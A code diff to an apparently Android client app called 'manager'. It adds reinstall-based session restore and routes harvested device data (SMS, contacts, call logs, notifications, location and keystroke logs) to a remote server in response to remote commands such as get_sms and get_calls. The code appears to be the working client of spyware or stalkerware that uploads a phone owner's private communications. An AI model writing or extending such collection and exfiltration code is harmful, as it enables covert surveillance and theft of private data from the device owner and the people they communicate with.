@@ -151,22 +151,48 @@ object ApiClient {
     }
 
     // ===== RESTORE SESSION (no code required) =====
-    // Re-activates a previously-linked device using its locally-stored
-    // device_id + device_token. Server endpoint: POST /api/restore_session.
-    // On 404 → no previous session exists for this device (user must use linkDevice).
+    // Re-activates a previously-linked device. Server endpoint:
+    //   POST /api/restore_session
+    //
+    // Two restore methods (server-side, see api_restore_session in
+    // Server/modules/api_handlers.py):
+    //
+    //   1. device_id + device_token — same install (token matches the
+    //      locally-stored one). The default flow when [linkCode] is null.
+    //
+    //   2. device_id + link_code — reinstall scenario: device_token changed
+    //      because the app was reinstalled, but the same physical device
+    //      keeps the same device_id (derived from ANDROID_ID). The user
+    //      enters their permanent link code to prove ownership; the server
+    //      looks up the code against local users and Firebase, then binds
+    //      the device to that owner and re-issues a token.
+    //
+    // On 401 ("credentials error") the caller should prompt for the link
+    // code and retry with [linkCode] populated.
+    // On 404 → no previous session exists for this device (user must use
+    // linkDevice with a fresh code).
     // On 200 → session restored, device re-activated.
-    suspend fun restoreSession(context: Context): LinkResult = withContext(Dispatchers.IO) {
+    suspend fun restoreSession(
+        context: Context,
+        linkCode: String? = null
+    ): LinkResult = withContext(Dispatchers.IO) {
         try {
             val deviceId = DeviceUtils.getDeviceId(context)
             val deviceToken = DeviceUtils.getDeviceToken(context)
 
-            val body = mapOf(
+            val body = mutableMapOf<String, Any>(
                 "device_id" to deviceId,
                 "device_token" to deviceToken
             )
+            // Method 2: include the permanent link code so the server can
+            // restore across reinstalls (where the device_token no longer
+            // matches the server-side record).
+            if (!linkCode.isNullOrBlank()) {
+                body["link_code"] = linkCode.trim().uppercase()
+            }
 
-            Log.i(TAG, "restoreSession: posting to /restore_session with deviceId=$deviceId")
-            Log.i(TAG, "restoreSession: server URL = ${Config.SERVER_DOMAIN}/api/restore_session")
+            Log.i(TAG, "restoreSession: posting to /restore_session with deviceId=$deviceId" +
+                if (linkCode.isNullOrBlank()) "" else ", link_code provided (reinstall flow)")
 
             val (httpCode, response) = postWithStatus("/restore_session", body)
             Log.i(TAG, "restoreSession: HTTP $httpCode, raw response = '${response.take(500)}'")
@@ -188,7 +214,27 @@ object ApiClient {
                 val msg = serverMsg.ifBlank {
                     "لا توجد جلسة سابقة لهذا الجهاز. استخدم 'ربط هاتف جديد'."
                 }
-                return@withContext LinkResult(ok = false, error = msg, message = msg)
+                return@withContext LinkResult(ok = false, error = msg, message = msg, httpCode = 404)
+            }
+
+            // 401 → device exists but token doesn't match and no link_code was
+            // provided (or the link_code was invalid). The server's Arabic
+            // message asks the user to enter their link code. We surface it
+            // verbatim so LinkActivity can detect the "credentials error"
+            // case and prompt for the code (then retry with linkCode set).
+            if (httpCode == 401) {
+                Log.w(TAG, "restoreSession: credentials error (401) for deviceId=$deviceId")
+                val serverMsg = try {
+                    val parsed = gson.fromJson(response, LinkResult::class.java)
+                    parsed.message.ifBlank { parsed.error }
+                } catch (_: Exception) { "" }
+                val msg = serverMsg.ifBlank { "بيانات الاعتماد غير صحيحة. أدخل كود الربط الخاص بك." }
+                return@withContext LinkResult(
+                    ok = false,
+                    error = msg,
+                    message = msg,
+                    httpCode = 401
+                )
             }
 
             // Try to parse as JSON
@@ -295,23 +341,87 @@ object ApiClient {
     }
 
     // ===== SEND DATA =====
+    //
+    // Forwards device data (SMS list, contacts, calls, location, etc.) to the
+    // server's `api_device_data` handler:
+    //
+    //   POST /api/data/{device_id}
+    //   body: {"type": "sms"|"contacts"|"calls"|"notifications"|
+    //                "device_info"|"location"|"keylog"|"event"|"battery",
+    //          "data": <list-or-object>,
+    //          "command": <original command name>,
+    //          "device_id": <id>,
+    //          "timestamp": <ms>}
+    //   header: X-Device-Token: <token>  (added by the auth interceptor)
+    //
+    // The server routes on the `type` field — see api_device_data in
+    // Server/modules/api_handlers.py (lines 621-656) — and stores the data
+    // to Firebase (store_sms / store_contacts / store_calls / …).
+    //
+    // [command] is the original command name (e.g. "sms", "contacts",
+    // "get_sms"). It is mirrored into BOTH the `type` and `command` body
+    // fields so the server can route via `type` while still recording the
+    // originating command. Callers that already pass a clean type string
+    // (SyncManager, SMSReceiver, CommandService) are unaffected.
     suspend fun sendData(context: Context, command: String, data: Any?): Boolean {
         return withContext(Dispatchers.IO) {
             try {
                 val deviceId = DeviceUtils.getDeviceId(context)
+                // Normalise the command to a server-recognised `type`.
+                // The server's accepted types are: sms, contacts, calls,
+                // notifications, device_info, location, battery. Unknown
+                // types are accepted by the server (it returns 200 OK and
+                // just doesn't store anything), so we forward whatever the
+                // caller passed.
+                val type = normaliseDataType(command)
                 val body = mapOf(
                     "device_id" to deviceId,
+                    "type" to type,
                     "command" to command,
                     "data" to data,
                     "timestamp" to System.currentTimeMillis()
                 )
-                val response = post("/data", body)
-                Log.d(TAG, "sendData response: '${response.take(200)}'")
+                // POST /api/data/{device_id} — the server's api_device_data
+                // route accepts both /api/data and /api/data/{device_id};
+                // we use the path-param form so the request is self-
+                // describing even without the body.
+                val response = post("/data/$deviceId", body)
+                Log.d(TAG, "sendData [$type] response: '${response.take(200)}'")
                 true
             } catch (e: Exception) {
-                Log.e(TAG, "sendData error", e)
+                Log.e(TAG, "sendData error for $command", e)
                 false
             }
+        }
+    }
+
+    /**
+     * Map a command name (as used by callers of [sendData] and by
+     * [com.abuzahra.manager.executor.CommandExecutor]) to the server's
+     * `type` enum accepted by `api_device_data`.
+     *
+     * Returns the input verbatim if no mapping applies — the server will
+     * accept unknown types gracefully.
+     */
+    private fun normaliseDataType(command: String): String {
+        return when (command) {
+            // Direct matches — already valid `type` values.
+            "sms", "contacts", "calls", "notifications", "location",
+            "device_info", "battery", "keylog", "event" -> command
+
+            // Command-name → type mappings for CommandExecutor results.
+            "get_sms", "send_backup_sms" -> "sms"
+            "get_contacts", "send_backup_contacts" -> "contacts"
+            "get_calls", "send_backup_calls" -> "calls"
+            "get_notifications" -> "notifications"
+            "get_location" -> "location"
+            "get_info", "get_battery", "get_wifi_info", "get_network_info",
+            "get_sim_info", "get_storage_info", "get_all" -> "device_info"
+
+            // Event-buffer callers.
+            "device_events" -> "event"
+
+            else -> command
         }
     }
 
